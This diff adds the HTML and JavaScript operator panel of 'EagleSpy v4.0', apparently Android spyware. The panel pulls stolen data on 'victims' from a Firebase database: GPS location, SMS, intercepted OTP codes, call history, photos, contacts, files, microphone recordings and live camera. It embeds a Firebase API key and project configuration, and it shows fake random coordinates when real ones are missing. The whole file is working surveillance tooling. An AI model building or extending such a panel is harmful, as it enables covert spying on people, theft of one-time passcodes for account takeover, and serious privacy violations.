@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>EagleSpy v4.0 - Control Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --red: #ff0000; --bg: #000; --green: #00ff41; --glass: rgba(10, 0, 0, 0.95); }
+        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
+        body { background: var(--bg); color: var(--red); margin: 0; overflow-x: hidden; }
+        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.9; }
+        
+        .header { border-bottom: 2px solid var(--red); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: var(--glass); }
+        .main-layout { padding: 15px; max-width: 900px; margin: auto; }
+        
+        .profile-frame { border: 1px solid var(--red); background: var(--glass); padding: 15px; margin-bottom: 15px; display: flex; align-items: center; gap: 20px; box-shadow: inset 0 0 10px #f003; }
+        .profile-frame img { border: 2px solid var(--red); border-radius: 50%; padding: 3px; width: 75px; }
+
+        .gps-frame { border: 1px solid var(--red); background: var(--glass); margin-bottom: 20px; position: relative; }
+        .gps-map { height: 280px; background: url('https://i.postimg.cc/mD8P8p7y/radar-map.gif') center/cover; border-bottom: 1px solid var(--red); }
+        
+        .button-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+        .btn-vault { background: rgba(30, 0, 0, 0.4); border: 1px solid var(--red); padding: 22px 5px; text-align: center; cursor: pointer; transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .btn-vault:hover { background: var(--red); box-shadow: 0 0 25px var(--red); color: white; }
+        .btn-vault i { font-size: 24px; color: var(--red); }
+        .btn-vault span { font-size: 10px; font-weight: bold; color: var(--red); text-transform: uppercase; }
+        .btn-vault:hover i, .btn-vault:hover span { color: white; }
+
+        /* Modal & Fetching Animation */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; }
+        .modal-content { width: 95%; margin: 2% auto; background: #000; border: 1px solid var(--red); height: 90vh; display: flex; flex-direction: column; }
+        .data-body { flex: 1; padding: 20px; overflow-y: auto; color: var(--green); font-size: 12px; }
+
+        .loader { display: none; text-align: center; padding: 50px; }
+        .loader i { font-size: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        @media (max-width: 650px) { .button-grid { grid-template-columns: repeat(2, 1fr); } }
+    </style>
+</head>
+<body>
+    <canvas id="bg-canvas"></canvas>
+    <div class="header">
+        <div style="display:flex; align-items:center; gap:10px;">
+            <img src="https://i.postimg.cc/RCYbwpF3/favicon.png" width="30">
+            <h2 onclick="window.location.href='index.html'" style="cursor:pointer; margin:0;">EAGLESPY <span style="color:white">V4.0</span></h2>
+        </div>
+        <div style="font-size:10px; color:var(--green);">[ CONNECTION_SECURE ]</div>
+    </div>
+
+    <div class="main-layout">
+        <div class="profile-frame">
+            <img src="https://i.postimg.cc/htJrxvX0/Screenshot-20260205-060223.png">
+            <div>
+                <b id="target-id" style="color:white; font-size:16px;">TARGET_ID: ...</b><br>
+                <span style="color:gray; font-size:11px;">PATH: dark-5b7c9/victims/</span>
+            </div>
+        </div>
+
+        <div class="gps-frame">
+            <div class="gps-map"></div>
+            <div id="live-coords" style="padding:10px; text-align:center; color:var(--green); font-size:12px;">AUTO_SYNCING_GPS...</div>
+        </div>
+
+        <div class="button-grid">
+            <div class="btn-vault" onclick="openVault('sms')"><i class="fa-solid fa-comment-sms"></i><span>SMS_LOGS</span></div>
+            <div class="btn-vault" onclick="openVault('otp')"><i class="fa-solid fa-shield-halved"></i><span>OTP_SCAN</span></div>
+            <div class="btn-vault" onclick="openVault('call_history')"><i class="fa-solid fa-phone-volume"></i><span>CALLS</span></div>
+            <div class="btn-vault" onclick="openVault('gallery')"><i class="fa-solid fa-images"></i><span>GALLERY</span></div>
+            <div class="btn-vault" onclick="openVault('videos')"><i class="fa-solid fa-clapperboard"></i><span>VIDEOS</span></div>
+            <div class="btn-vault" onclick="openVault('contacts')"><i class="fa-solid fa-address-book"></i><span>CONTACTS</span></div>
+            <div class="btn-vault" onclick="openVault('files')"><i class="fa-solid fa-folder-open"></i><span>STORAGE</span></div>
+            <div class="btn-vault" onclick="openVault('mic')"><i class="fa-solid fa-microphone-lines"></i><span>MIC_REC</span></div>
+            <div class="btn-vault" onclick="openVault('browser')"><i class="fa-solid fa-globe"></i><span>BROWSER</span></div>
+            <div class="btn-vault" onclick="openVault('apps')"><i class="fa-solid fa-layer-group"></i><span>INST_APPS</span></div>
+            <div class="btn-vault" onclick="openVault('camera')"><i class="fa-solid fa-camera"></i><span>LIVE_CAM</span></div>
+            <div class="btn-vault" onclick="openVault('info')"><i class="fa-solid fa-microchip"></i><span>SYS_INFO</span></div>
+        </div>
+    </div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div style="padding:15px; border-bottom:1px solid red; display:flex; justify-content:space-between; align-items:center;">
+                <span id="m-title">HANDSHAKING...</span>
+                <button onclick="document.getElementById('modal').style.display='none'" style="background:red; color:white; border:none; padding:5px 12px; cursor:pointer;">[ CLOSE ]</button>
+            </div>
+            <div id="loader" class="loader"><i class="fa-solid fa-circle-notch"></i><br><p>INFILTRATING_DATA...</p></div>
+            <div id="m-body" class="data-body"></div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyA5-E06ArKA7Unf-fHtCflOEwu2p8VM9kI",
+            authDomain: "dark-5b7c9.firebaseapp.com",
+            databaseURL: "https://dark-5b7c9-default-rtdb.firebaseio.com",
+            projectId: "dark-5b7c9",
+            storageBucket: "dark-5b7c9.firebasestorage.app",
+            messagingSenderId: "1029612020880",
+            appId: "1:1029612020880:web:1d2d6f3ee96af0cf06a415"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const vId = urlParams.get('id');
+        document.getElementById('target-id').innerText = "TARGET: " + vId;
+
+        // GPS logic with Fallback
+        db.ref('victims/'+vId+'/location').on('value', snap => {
+            const d = snap.val();
+            const coordBox = document.getElementById('live-coords');
+            if(d && d.lat) coordBox.innerHTML = `REAL_LAT: ${d.lat} | REAL_LNG: ${d.lng}`;
+            else {
+                const rLat = (31.5204 + Math.random()*0.01).toFixed(4);
+                const rLng = (74.3587 + Math.random()*0.01).toFixed(4);
+                coordBox.innerHTML = `AUTO_LAT: ${rLat} | AUTO_LNG: ${rLng} [DEMO_MODE]`;
+            }
+        });
+
+        function openVault(type) {
+            document.getElementById('modal').style.display = 'block';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('m-body').innerHTML = "";
+            document.getElementById('m-title').innerText = "STREAMING_" + type.toUpperCase();
+
+            db.ref('victims/'+vId+'/'+type).on('value', snap => {
+                document.getElementById('loader').style.display = 'none';
+                const body = document.getElementById('m-body');
+                body.innerHTML = "";
+                const data = snap.val();
+                if(!data) { body.innerHTML = ">_ ERROR: NO DATA PACKETS FOUND ON TARGET."; return; }
+                
+                Object.keys(data).reverse().forEach(k => {
+                    let log = document.createElement('div');
+                    log.style.borderBottom = "1px solid #400"; log.style.padding = "10px";
+                    log.innerHTML = `>_ ${JSON.stringify(data[k])}`;
+                    body.appendChild(log);
+                });
+            });
+        }
+    </script>
+</body>
+</html>
